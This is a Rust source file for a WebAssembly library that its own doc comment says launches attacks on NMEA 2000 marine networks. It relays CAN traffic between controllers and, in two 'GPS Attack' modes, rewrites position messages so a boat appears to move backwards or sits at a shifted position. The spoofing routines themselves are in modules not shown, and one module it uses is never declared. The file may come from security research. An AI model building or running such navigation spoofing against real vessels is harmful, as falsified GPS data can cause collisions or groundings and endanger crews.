#![warn(missing_docs)]

//! # nmea_attack
//!
//! A libary design to be compiled as a WebAssembley (wasm) app used to launch attacks on a NMEA 2000 network



// Modules
mod nmea_msg;
mod native_functions;
mod opposite_dir_attack;

use nmea_msg::NMEAMsg;
use crate::opposite_dir_attack::opp_dir_attack;
use crate::translation_attack::translation_attack;

/// Points to a message requested from the native read queue
static mut MSG_PTR: *const u8 = std::ptr::null();
static mut MODE_PTR: *const u8 = std::ptr::null();


/// links MSG_PTR to the message buffer allocated for the wasm app
///
/// Sets MSG_PTR to the allocated wasm buffer so that when the native code updates the buffer, the updates can be accessed from within this app. 
/// This function is called from the native code before the main() function is executed. 
#[no_mangle]
pub extern "C" fn link_msg_buffer(char_arr: *const u8, _char_array_size: i32 ){
    unsafe {
        MSG_PTR = char_arr;
    }
}

/// links MODE_PTR to the mode buffer allocated for the wasm app
///
/// Sets MODE_PTR to the allocated wasm buffer so that when the native code updates the buffer, the updates can be accessed from within this app. 
/// This function is called from the native code before the main() function is executed. 
#[no_mangle]
pub extern "C" fn link_mode_buffer(char_arr: *const u8, _char_array_size: i32 ){
    unsafe {
        MODE_PTR = char_arr;
    }
}


/// Main execution loop
///
/// Called from native code as a pthread. Reads messages from MSG_PTR, modifies certain messages, and send messages out on the appropriate send queue. 
#[no_mangle]
fn main() {

    let mut msg = NMEAMsg::default();

    unsafe{
        // Get Mode
        let mode_arr = std::slice::from_raw_parts(MODE_PTR, 1 as usize);
        let mode = mode_arr[0];

        if mode == 48
        {
            // OFF Mode
            // Do Nothing
        }
        else if mode == 49 //0x31 in decima, ACSII for 1
        {
            // PASSIVE Mode
            msg = nmea_msg::chars_to_nmea(MSG_PTR,nmea_msg::MAX_DATA_LENGTH_BYTES);

            if msg.controller_num == 0 {
                native_functions::SendMsg(1 as i32, msg.priority as i32, msg.pgn as i32, msg.source as i32, msg.data.as_ptr(), msg.data_length_bytes as i32); // Send to controller 1
                native_functions::SendMsg(2 as i32, msg.priority as i32, msg.pgn as i32, msg.source as i32, msg.data.as_ptr(), msg.data_length_bytes as i32); // Send to controller 2
            }
            else if msg.controller_num == 1{
                native_functions::SendMsg(0 as i32, msg.priority as i32, msg.pgn as i32, msg.source as i32, msg.data.as_ptr(), msg.data_length_bytes as i32); // Send to controller 0
                native_functions::SendMsg(2 as i32, msg.priority as i32, msg.pgn as i32, msg.source as i32, msg.data.as_ptr(), msg.data_length_bytes as i32); // Send to controller 2
            }
            else if msg.controller_num == 2{
                native_functions::SendMsg(0 as i32, msg.priority as i32, msg.pgn as i32, msg.source as i32, msg.data.as_ptr(), msg.data_length_bytes as i32); // Send to controller 0
                native_functions::SendMsg(1 as i32, msg.priority as i32, msg.pgn as i32, msg.source as i32, msg.data.as_ptr(), msg.data_length_bytes as i32); // Send to controller 1
            }    
        }
        else if mode == 50
        {
            // GPS Attack Mode - Show boat moving in opposite direction
            let mut mod_msg = NMEAMsg::default();
            msg = nmea_msg::chars_to_nmea(MSG_PTR,nmea_msg::MAX_DATA_LENGTH_BYTES);


            if msg.pgn != 129029 // Blocking 129029 for now because have not yet implemented a method to handle data spanning multiple CAN frames
            {
                mod_msg = opp_dir_attack(msg); // modified message

                if mod_msg.controller_num == 0 {
                    native_functions::SendMsg(1 as i32, mod_msg.priority as i32, mod_msg.pgn as i32, mod_msg.source as i32, mod_msg.data.as_ptr(), mod_msg.data_length_bytes as i32); // Send to controller 1
                    native_functions::SendMsg(2 as i32, mod_msg.priority as i32, mod_msg.pgn as i32, mod_msg.source as i32, mod_msg.data.as_ptr(), mod_msg.data_length_bytes as i32); // Send to controller 2
                }
                else if mod_msg.controller_num == 1{
                    native_functions::SendMsg(0 as i32, mod_msg.priority as i32, mod_msg.pgn as i32, mod_msg.source as i32, mod_msg.data.as_ptr(), mod_msg.data_length_bytes as i32); // Send to controller 0
                    native_functions::SendMsg(2 as i32, mod_msg.priority as i32, mod_msg.pgn as i32, mod_msg.source as i32, mod_msg.data.as_ptr(), mod_msg.data_length_bytes as i32); // Send to controller 2
                }
                else if mod_msg.controller_num == 2{
                    native_functions::SendMsg(0 as i32, mod_msg.priority as i32, mod_msg.pgn as i32, mod_msg.source as i32, mod_msg.data.as_ptr(), mod_msg.data_length_bytes as i32); // Send to controller 0
                    native_functions::SendMsg(1 as i32, mod_msg.priority as i32, mod_msg.pgn as i32, mod_msg.source as i32, mod_msg.data.as_ptr(), mod_msg.data_length_bytes as i32); // Send to controller 1
                } 
            }


        }    
        else if mode == 51
        {
            // GPS Attack Mode - Shift boat's position by a constant
            let mut mod_msg = NMEAMsg::default();
            msg = nmea_msg::chars_to_nmea(MSG_PTR,nmea_msg::MAX_DATA_LENGTH_BYTES);


            if msg.pgn != 129029 // Blocking 129029 for now because have not yet implemented a method to handle data spanning multiple CAN frames
            {
                mod_msg = translation_attack(msg); // modified message

                if mod_msg.controller_num == 0 {
                    native_functions::SendMsg(1 as i32, mod_msg.priority as i32, mod_msg.pgn as i32, mod_msg.source as i32, mod_msg.data.as_ptr(), mod_msg.data_length_bytes as i32); // Send to controller 1
                    native_functions::SendMsg(2 as i32, mod_msg.priority as i32, mod_msg.pgn as i32, mod_msg.source as i32, mod_msg.data.as_ptr(), mod_msg.data_length_bytes as i32); // Send to controller 2
                }
                else if mod_msg.controller_num == 1{
                    native_functions::SendMsg(0 as i32, mod_msg.priority as i32, mod_msg.pgn as i32, mod_msg.source as i32, mod_msg.data.as_ptr(), mod_msg.data_length_bytes as i32); // Send to controller 0
                    native_functions::SendMsg(2 as i32, mod_msg.priority as i32, mod_msg.pgn as i32, mod_msg.source as i32, mod_msg.data.as_ptr(), mod_msg.data_length_bytes as i32); // Send to controller 2
                }
                else if mod_msg.controller_num == 2{
                    native_functions::SendMsg(0 as i32, mod_msg.priority as i32, mod_msg.pgn as i32, mod_msg.source as i32, mod_msg.data.as_ptr(), mod_msg.data_length_bytes as i32); // Send to controller 0
                    native_functions::SendMsg(1 as i32, mod_msg.priority as i32, mod_msg.pgn as i32, mod_msg.source as i32, mod_msg.data.as_ptr(), mod_msg.data_length_bytes as i32); // Send to controller 1
                } 
            }


        }  

    }  

}
